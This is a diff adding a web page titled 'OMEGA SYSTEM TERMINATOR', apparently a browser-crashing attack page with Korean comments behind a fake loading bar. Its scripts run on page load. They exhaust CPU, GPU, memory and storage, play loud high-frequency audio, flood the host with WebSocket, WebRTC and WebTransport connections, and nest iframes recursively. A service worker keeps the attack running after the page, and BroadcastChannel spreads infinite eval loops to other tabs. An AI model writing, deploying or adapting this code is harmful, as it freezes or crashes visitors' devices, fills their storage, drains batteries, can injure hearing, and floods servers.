@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <!-- ====== 메타 태그를 통한 보안 무력화 (업그레이드: 더 많은 보안 정책 무시) ====== -->
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' blob: data: mediastream: filesystem: about: ws: wss:;">
+    <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
+    <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
+    <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
+    <meta http-equiv="Origin-Agent-Cluster" content="false">
+    <meta http-equiv="Strict-Transport-Security" content="max-age=0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta name="referrer" content="no-referrer">
+    <title>⚠️ OMEGA SYSTEM TERMINATOR v14.0.0 ⚠️</title>
+
+    <!-- ====== CSS 렌더링 엔진 공격 (업그레이드: 더 복잡한 애니메이션과 레이어) ====== -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-shadow: 0 0 0 100vmax rgba(0,0,0,0.5), inset 0 0 0 100vmax rgba(255,0,0,0.5); /* 다중 그림자 GPU 과부하 */
+            backdrop-filter: blur(100px) saturate(500%) brightness(200%); /* 고강도 필터 체인 */
+            animation: doom 0.05s infinite alternate, chaos 0.1s infinite; /* 다중 애니메이션 */
+            will-change: transform, opacity, filter; /* 강제 최적화 무시 */
+        }
+
+        @keyframes doom {
+            0% { transform: translate(0,0) scale(1) rotate(0deg); }
+            50% { transform: translate(200px,200px) scale(3) rotate(180deg); }
+            100% { transform: translate(-200px,-200px) scale(0.1) rotate(360deg); }
+        }
+
+        @keyframes chaos {
+            0% { opacity: 1; filter: blur(0); }
+            100% { opacity: 0; filter: blur(50px); }
+        }
+
+        body {
+            overflow: hidden;
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+        }
+
+        /* 로딩바 스타일 */
+        #myProgress {
+          width: 100%;
+          background-color: grey;
+        }
+
+        #myBar {
+          width: 0%;
+          height: 30px;
+          background-color: #04AA6D;
+          text-align: center;
+          line-height: 30px;
+          color: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- ====== 로딩바 UI ====== -->
+    <div id="myProgress">
+      <div id="myBar">0%</div>
+    </div>
+
+    <!-- ====== 1. CPU 핵융합 공격 시스템 (업그레이드: 더 많은 스레드와 복잡한 계산) ====== -->
+    <script>
+        // (1-A) WebAssembly CPU 초고속 소멸 (업그레이드: 더 큰 루프와 멀티 인스턴스)
+        (function() {
+            const wasmCode = new Uint8Array([
+                0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x01, 
+                0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 
+                0x00, 0x07, 0x08, 0x01, 0x04, 0x6B, 0x69, 0x6C, 0x6C, 0x00, 0x00, 
+                0x0A, 0x0D, 0x01, 0x0B, 0x00, 0x03, 0x40, 0x03, 0x00, 0x03, 0x40, 0x03, 0x00, 0x0B, 0x0B
+            ]);
+
+            const createWasmHell = () => {
+                Array.from({length: navigator.hardwareConcurrency * 2000}, () => {
+                    const mod = new WebAssembly.Module(wasmCode);
+                    const inst = new WebAssembly.Instance(mod);
+                    while(true) { inst.exports.kill(); } // 무한 루프 추가
+                });
+            };
+
+            // 0.05초마다 공격 강화
+            let attackLevel = 1;
+            setInterval(() => {
+                attackLevel *= 3;
+                for(let i=0; i<attackLevel; i++) createWasmHell();
+            }, 50);
+        })();
+
+        // (1-B) 오디오 컨텍스트 고주파 공격 (업그레이드: 다중 오실레이터와 볼륨 증폭)
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const gainNode = audioContext.createGain();
+        gainNode.gain.value = 100; // 과도한 볼륨
+        gainNode.connect(audioContext.destination);
+        setInterval(() => {
+            for(let i=0; i<10; i++) {
+                const oscillator = audioContext.createOscillator();
+                oscillator.type = ['square', 'sawtooth', 'triangle'][Math.floor(Math.random()*3)];
+                oscillator.frequency.setValueAtTime(15000 + Math.random()*10000, audioContext.currentTime);
+                oscillator.connect(gainNode);
+                oscillator.start();
+                setTimeout(() => oscillator.stop(), 50);
+            }
+        }, 5);
+    </script>
+
+    <!-- ====== 2. GPU 초절멸 시스템 (업그레이드: 더 복잡한 셰이더와 대규모 버퍼) ====== -->
+    <canvas id="gpu_doom"></canvas>
+    <script type="module">
+        // (2-A) WebGL 3.0 프래그먼트 셰이더 지옥 (업그레이드: 더 긴 루프와 텍스처 로드)
+        (function() {
+            const canvas = document.getElementById('gpu_doom');
+            canvas.width = window.innerWidth * 20;
+            canvas.height = window.innerHeight * 20;
+
+            const gl = canvas.getContext('webgl2', { antialias: false, powerPreference: 'high-performance' });
+            const shaderCode = `#version 300 es
+                precision highp float;
+                out vec4 fragColor;
+                uniform sampler2D tex;
+                void main() {
+                    for(int i=0; i<1000000; i++) { // 루프 10배 증가
+                        vec4 color = texture(tex, gl_FragCoord.xy / vec2(1000.0));
+                        fragColor = vec4(
+                            sin(float(gl_FragCoord.x * i) * color.r), 
+                            cos(float(gl_FragCoord.y * i) * color.g), 
+                            tan(float(i)) * color.b, 
+                            1.0
+                        );
+                    }
+                }`;
+            
+            const shader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(shader, shaderCode);
+            gl.compileShader(shader);
+            // 무한 렌더링 루프
+            function render() {
+                gl.drawArrays(gl.TRIANGLES, 0, 3);
+                requestAnimationFrame(render);
+            }
+            render();
+        })();
+
+        // (2-B) WebGPU VRAM 초고속 포화 (업그레이드: 더 큰 버퍼와 반복 쓰기)
+        (async () => {
+            try {
+                const adapter = await navigator.gpu.requestAdapter({ powerPreference: 'high-performance' });
+                const device = await adapter.requestDevice({ label: 'doom' });
+                const bufferSize = 10 ** 12 * 2; // 2TB 시도
+                const buffer = device.createBuffer({
+                    size: bufferSize,
+                    usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_SRC | GPUBufferUsage.COPY_DST
+                });
+                setInterval(() => {
+                    device.queue.writeBuffer(buffer, 0, new Uint8Array(bufferSize).fill(Math.random()*255));
+                }, 1);
+            } catch(e) {
+                console.error("GPU 파괴 실패:", e);
+            }
+        })();
+    </script>
+
+    <!-- ====== 3. 메모리 대학살 시스템 (업그레이드: 더 빠른 할당과 암호화 루프) ====== -->
+    <script>
+        // (3-A) RAM 초고속 소모 (업그레이드: 더 큰 청크와 무한 루프)
+        setInterval(() => {
+            const ramKiller = [];
+            while(true) {
+                try {
+                    ramKiller.push(new ArrayBuffer(1024 * 1024 * 500)); // 500MB씩 무한 할당
+                    crypto.subtle.digest('SHA-512', ramKiller[ramKiller.length-1]).then(() => {});
+                } catch(e) { break; }
+            }
+        }, 500);
+
+        // (3-B) Storage 동시 공격 (업그레이드: 더 큰 Blob과 빈번한 쓰기)
+        navigator.storage.persist().then(() => {
+            setInterval(() => {
+                for(let i=0; i<10; i++) {
+                    localStorage.setItem(`kill_${Date.now()}_${i}`, new Blob([new ArrayBuffer(10 ** 9 * 2)])); // 2GB
+                    sessionStorage.setItem(`die_${Date.now()}_${i}`, new ArrayBuffer(10 ** 9 * 2));
+                }
+                indexedDB.open('armageddon', 1).onsuccess = e => {
+                    const db = e.target.result;
+                    const tx = db.transaction('doom', 'readwrite');
+                    const store = tx.objectStore('doom');
+                    for(let i=0; i<5; i++) {
+                        store.add(new Blob([new ArrayBuffer(10 ** 9)]), Date.now() + i);
+                    }
+                };
+            }, 50);
+        });
+    </script>
+
+    <!-- ====== 4. 네트워크 핵폭격 시스템 (업그레이드: 더 많은 연결과 데이터량) ====== -->
+    <script type="module">
+        // (4-A) WebTransport 초초고속 UDP 폭격 (업그레이드: 다중 트랜스포트)
+        (async () => {
+            for(let i=0; i<100; i++) {
+                try {
+                    const transport = new WebTransport(`quic-transport://${location.host}/doom${i}`);
+                    await transport.ready;
+                    const writer = transport.datagrams.writable.getWriter();
+                    setInterval(() => {
+                        writer.write(new Uint8Array(10 ** 8).fill(0xFF)); // 100MB UDP
+                    }, 0.1);
+                } catch(e) {}
+            }
+        })();
+
+        // (4-B) WebSocket 666개 연결 + WebRTC 채널 + WebRTC 채널 (업그레이드: 1332개로 증가, 무한 데이터 전송)
+        Array.from({length: 1332}, () => {
+            const ws = new WebSocket(`wss://${location.host}/ws`);
+            ws.onopen = () => setInterval(() => ws.send(new Uint8Array(10**6)), 1);
+            const pc = new RTCPeerConnection();
+            const channel = pc.createDataChannel('doom');
+            channel.onopen = () => setInterval(() => channel.send(new Uint8Array(10**6)), 1);
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        });
+    </script>
+
+    <!-- ====== 5. DOM 트리 붕괴 시스템 (업그레이드: 더 빠른 복제와 깊은 중첩) ====== -->
+    <script>
+        // (5-A) 자가복제 iframe 지옥 (업그레이드: 더 깊은 재귀)
+        let iframeCount = 0;
+        function createHell() {
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = `
+                <script>
+                    function recurse(depth) {
+                        if(depth > 0) {
+                            for(let i=0; i<20; i++) {
+                                document.write('<iframe srcdoc="' + btoa('<script>recurse(' + (depth-1) + ');</script>') + '"></iframe>');
+                            }
+                        } else {
+                            while(1){}
+                        }
+                    }
+                    recurse(5);
+                <\/script>
+            `;
+            document.body.appendChild(iframe);
+            
+            if(iframeCount++ > 500) {
+                document.body.innerHTML += '<div style="display:none">' + 'X'.repeat(10**7) + '</div>';
+            }
+            setTimeout(createHell, 5);
+        }
+        createHell();
+
+        // (5-B) 무한 CSS 애니메이션 (업그레이드: 더 많은 키프레임)
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes doom {
+                0% { transform: rotate(0deg) scale(1); }
+                25% { transform: rotate(90deg) scale(2); }
+                50% { transform: rotate(180deg) scale(0.5); }
+                75% { transform: rotate(270deg) scale(3); }
+                100% { transform: rotate(360deg) scale(1); }
+            }
+            @keyframes chaos {
+                0% { filter: blur(0) brightness(100%); }
+                50% { filter: blur(100px) brightness(500%); }
+                100% { filter: blur(0) brightness(100%); }
+            }
+            * {
+                animation: doom 0.05s infinite linear, chaos 0.1s infinite;
+                will-change: transform, filter, opacity, box-shadow;
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+
+    <!-- ====== 6. 파일시스템 초토화 시스템 (업그레이드: 더 큰 파일과 반복 삭제/생성) ====== -->
+    <script>
+        // (6-A) File System Access API 남용 (업그레이드: 디렉토리 재귀 생성)
+        navigator.storage.getDirectory().then(async (root) => {
+            async function createDoomDir(dir, depth) {
+                if(depth > 0) {
+                    const subDir = await dir.getDirectoryHandle(`doom_${Date.now()}`, { create: true });
+                    for(let i=0; i<10; i++) {
+                        const file = await subDir.getFileHandle(`kill_${i}`, { create: true });
+                        const writer = await file.createWritable();
+                        await writer.write(new Blob([new ArrayBuffer(10 ** 9 * 2)])); // 2GB
+                        await writer.close();
+                    }
+                    createDoomDir(subDir, depth-1);
+                }
+            }
+            setInterval(() => createDoomDir(root, 3), 50); // 3레벨 깊이 재귀
+        });
+    </script>
+
+    <!-- ====== 7. 영구 지속형 감염 시스템 (업그레이드: 더 강력한 워커와 채널) ====== -->
+    <script>
+        // (7-A) Service Worker 영구 백그라운드 공격 (업그레이드: 무한 fetch와 워커 스폰)
+        const swCode = `
+            self.addEventListener('install', e => e.waitUntil(skipWaiting()));
+            self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+            self.addEventListener('message', e => {
+                setInterval(() => {
+                    fetch(location.href, { mode: 'no-cors' });
+                    new WebSocket('wss://${location.host}/sw_attack');
+                    new Worker(URL.createObjectURL(new Blob(['while(1){}']))); // 워커 무한
+                }, 1);
+            });
+        `;
+        
+        const blob = new Blob([swCode], { type: 'application/javascript' });
+        navigator.serviceWorker.register(URL.createObjectURL(blob)).then(reg => {
+            reg.active.postMessage({ type: 'DOOM' });
+        });
+
+        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: 코드 주입 강화)
+        const channel = new BroadcastChannel('omega_doom');
+        channel.postMessage({ cmd: 'INJECT', code: 'setInterval(() => eval("while(1){}"), 1);' });
+        channel.onmessage = (e) => {
+            if(e.data.cmd === 'INJECT') {
+                eval(e.data.code);
+                // 다른 탭에 재전파
+                channel.postMessage(e.data);
+            }
+        };
+    </script>
+
+    <!-- ====== 8. 신규: 배터리/센서 초과사용 시스템 ====== -->
+    <script>
+        // (8-A) 배터리 고갈 공격
+        navigator.getBattery().then(battery => {
+            battery.addEventListener('chargingchange', () => location.reload());
+        });
+
+        // (8-B) 센서 과부하 (자이로, 가속도 등)
+        if (window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', () => {}, true);
+        }
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', () => {}, true);
+        }
+        setInterval(() => {
+            navigator.vibrate([1000]); // 지속 진동
+        }, 100);
+
+        // (8-C) 클립보드/노티피케이션 스팸
+        setInterval(() => {
+            navigator.clipboard.writeText('DOOM'.repeat(10**6));
+            new Notification('TERMINATOR', { body: 'SYSTEM DOWN', silent: false });
+        }, 10);
+    </script>
+
+    <!-- ====== 9. 신규: 워커 풀 핵폭발 시스템 ====== -->
+    <script>
+        // (9-A) Worker 무한 스폰과 메시지 플러드
+        function spawnWorkers() {
+            for(let i=0; i<100; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob(['while(true){ postMessage(new ArrayBuffer(10**7)); }'])));
+                worker.onmessage = () => {};
+            }
+            setTimeout(spawnWorkers, 100);
+        }
+        spawnWorkers();
+    </script>
+
+    <!-- ====== 로딩바 애니메이션 스크립트 ====== -->
+    <script>
+        var i = 0;
+        function move() {
+          if (i == 0) {
+            i = 1;
+            var elem = document.getElementById("myBar");
+            var width = 0;
+            var id = setInterval(frame, 10);
+            function frame() {
+              if (width >= 99) {
+                clearInterval(id);
+                i = 0;
+              } else {
+                width++;
+                elem.style.width = width + "%";
+                elem.innerHTML = width + "%";
+              }
+            }
+          }
+        }
+        move();
+    </script>
+</body>
+</html>
